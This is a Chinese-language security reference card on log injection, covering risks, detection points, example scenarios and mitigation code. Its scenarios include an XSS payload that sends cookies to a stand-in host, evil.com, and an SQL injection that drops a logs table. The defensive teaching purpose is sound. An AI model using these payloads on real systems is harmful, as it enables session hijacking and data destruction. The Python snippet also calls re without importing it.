# 日志注入 (Log Injection)

## 元数据

| 属性 | 值 |
|------|-----|
| ID | CASE-EXT-DATA-004 |
| 分类 | 数据安全 / 日志安全 |
| tier 适用 | L1 ✅ |
| 创建时间 | 2026-06-11 |
| 最后更新 | 2026-06-11 |

---

## 一句话风险

攻击者通过注入恶意内容到日志系统，导致日志伪造、注入攻击、日志分析系统被利用或审计追踪被破坏。

---

## 一分钟识别清单

### ✅ 识别要点

- [ ] **未转义用户输入** - 日志内容直接包含用户输入且未进行编码处理
- [ ] **日志格式可操纵** - 攻击者可注入换行符、特殊字符破坏日志格式
- [ ] **日志查看器漏洞** - 日志分析系统存在 XSS 或命令注入漏洞

### 🔍 典型场景

```
场景 1: 日志伪造
恶意输入: "admin login success\n[INFO] User admin2 login success"
日志内容: [INFO] User admin login success
          [INFO] User admin2 login success
结果:     审计追踪被伪造

场景 2: 日志分析系统 XSS
恶意输入: "<script>document.location='http://evil.com/steal?c='+document.cookie</script>"
管理员查看日志时触发脚本
结果:     管理员会话被劫持

场景 3: SQL 注入日志
恶意输入: "'; DROP TABLE logs; --"
日志写入数据库时执行
结果:     日志数据被删除
```

---

## 一句话防御

**对所有日志内容进行严格转义和编码，使用结构化日志格式，限制日志查看器权限，实施日志完整性监控。**

---

## 推荐工具链接

| 工具/资源 | 用途 | 链接 |
|----------|------|------|
| **OWASP ESAPI** | 安全日志库 | https://github.com/ESAPI/esapi-java |
| **Logstash** | 日志处理管道 | https://www.elastic.co/logstash/ |
| **Fluentd** | 日志收集与处理 | https://www.fluentd.org/ |
| **ELK Stack** | 日志分析平台 | https://www.elastic.co/what-is/elk-stack |

---

## 快速缓解措施

### 1. 输入转义
```python
# Python 示例：日志内容转义
import logging
import html

def safe_log(message):
    # 移除或转义换行符和控制字符
    sanitized = message.replace('\n', '\\n').replace('\r', '\\r')
    # 移除 ANSI 转义序列
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    sanitized = ansi_escape.sub('', sanitized)
    return sanitized

logging.info(f"User action: {safe_log(user_input)}")
```

### 2. 结构化日志
```javascript
// Node.js 示例：JSON 结构化日志
const winston = require('winston');

const logger = winston.createLogger({
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [new winston.transports.File({ filename: 'app.log' })]
});

// 安全记录用户输入
logger.info('User action', {
  userId: user.id,
  action: 'login',
  input: sanitize(userInput)
});
```

### 3. 日志查看器安全
```html
<!-- 转义 HTML 输出 -->
<div class="log-entry">
  {{ log.content | escape }}
</div>

<!-- 或使用 Content Security Policy -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none';">
```

---

## 相关案例

- [CASE-EXT-DATA-005 临时文件暴露](./temp-file-exposure.md)
- [CASE-EXT-DATA-008 调试端点暴露](./debug-endpoint-exposure.md)

---

## 参考标准

- OWASP Logging Cheat Sheet
- CWE-117: Improper Output Neutralization for Logs
- NIST SP 800-92 - Guide to Computer Security Log Management
- PCI DSS Requirement 10 - Track and Monitor All Access
